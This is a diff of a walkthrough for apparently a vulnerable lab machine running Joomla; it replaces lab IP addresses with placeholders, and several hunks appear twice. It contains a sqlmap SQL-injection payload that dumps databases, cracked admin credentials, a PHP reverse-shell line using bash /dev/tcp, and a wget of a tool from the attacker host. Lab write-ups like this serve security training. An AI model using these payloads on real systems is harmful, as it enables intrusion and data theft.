@@ -40,7 +40,7 @@
 Ping the target machine.
 
 ```bash
-ping -c 4 192.168.29.235
+ping TARGET_IP
 ```
 
 ---
@@ -50,7 +50,7 @@ ping -c 4 192.168.29.235
 Perform a full port and service scan.
 
 ```bash
-nmap -sC -sV -Pn 192.168.29.235
+nmap -sC -sV -Pn TARGET_IP
 ```
 
 Example findings:
@@ -66,7 +66,7 @@ Example findings:
 Open the target in browser.
 
 ```bash
-http://192.168.29.235
+http://TARGET_IP
 ```
 
 Check the page source and identify technologies used.
@@ -78,13 +78,13 @@ Check the page source and identify technologies used.
 Use WhatWeb to fingerprint the website.
 
 ```bash
-whatweb 192.168.29.235
+whatweb TARGET_IP
 ```
 
 Use Joomla scanner.
 
 ```bash
-joomscan -u http://192.168.29.235
+joomscan -u http://TARGET_IP
 ```
 
 Possible result:
@@ -121,13 +121,13 @@ python3 42033.py
 Or manually exploit with sqlmap.
 
 ```bash
-sqlmap -u "http://192.168.29.235/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,user()),0)" --dbs
+sqlmap -u "http://TARGET_IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,user()),0)" --dbs
 ```
 
 Dump database contents.
 
 ```bash
-sqlmap -u "http://192.168.29.235/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,user()),0)" --dump
+sqlmap -u "http://TARGET_IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,user()),0)" --dump
 ```
 
 ---
@@ -153,7 +153,7 @@ admin:snoopy
 Visit:
 
 ```bash
-http://192.168.29.235/administrator
+http://TARGET_IP/administrator
 ```
 
 Login using the cracked credentials.
@@ -179,7 +179,7 @@ nc -lvnp 4444
 PHP reverse shell:
 
 ```php
-<?php system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.28.125/4444 0>&1'"); ?>
+<?php system("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1'"); ?>
 ```
 
 Save the file and trigger it from browser.
@@ -254,19 +254,19 @@ python3 -m http.server 8000
 On target machine:
 
 ```bash
-wget http://192.168.28.125:8000/linux-exploit-suggester.sh
+wget http://YOUR_KALI_IP:8000/linux-exploit-suggester.sh
 ```
 
 Give execute permission.
 
 ```bash
-chmod +x linux-exploit-suggester.sh
+chmod +x filename.sh
 ```
 
 Run the script.
 
 ```bash
-./linux-exploit-suggester.sh
+./filename.sh
 ```
 
 ---
@@ -401,7 +401,7 @@ ping -c 4 192.168.29.235
 Perform a full port and service scan.
 
 ```bash
-nmap -sC -sV -Pn 192.168.29.235
+nmap -sC -sV -Pn TARGET_IP
 ```
 
 Example findings:
@@ -417,7 +417,7 @@ Example findings:
 Open the target in browser.
 
 ```bash
-http://192.168.29.235
+http://TARGET_IP
 ```
 
 Check the page source and identify technologies used.
@@ -429,13 +429,13 @@ Check the page source and identify technologies used.
 Use WhatWeb to fingerprint the website.
 
 ```bash
-whatweb 192.168.29.235
+whatweb TARGET_IP
 ```
 
 Use Joomla scanner.
 
 ```bash
-joomscan -u http://192.168.29.235
+joomscan -u http://TARGET_IP
 ```
 
 Possible result:
@@ -472,13 +472,13 @@ python3 42033.py
 Or manually exploit with sqlmap.
 
 ```bash
-sqlmap -u "http://192.168.29.235/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,user()),0)" --dbs
+sqlmap -u "http://TARGET_IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,user()),0)" --dbs
 ```
 
 Dump database contents.
 
 ```bash
-sqlmap -u "http://192.168.29.235/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,user()),0)" --dump
+sqlmap -u "http://TARGET_IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,user()),0)" --dump
 ```
 
 ---
@@ -504,7 +504,7 @@ admin:snoopy
 Visit:
 
 ```bash
-http://192.168.29.235/administrator
+http://TARGET_IP/administrator
 ```
 
 Login using the cracked credentials.
@@ -537,7 +537,7 @@ OR
 ```text
 Download a reverse shell file from pentest monkey for the RShell and upload it in the Templates > Templates > Beez3 Details or protostar details in that both
 any kinds of php file delete that whole line and add the downloaded php file in that delete the files like # included and run it and save it and run
-in the brower http://192.168.29.235/Templates/WHERE ADDED FILES and $ appears
+in the brower http://TARGET_IP/Templates/WHERE ADDED FILES and $ appears
 and 
 ```
 
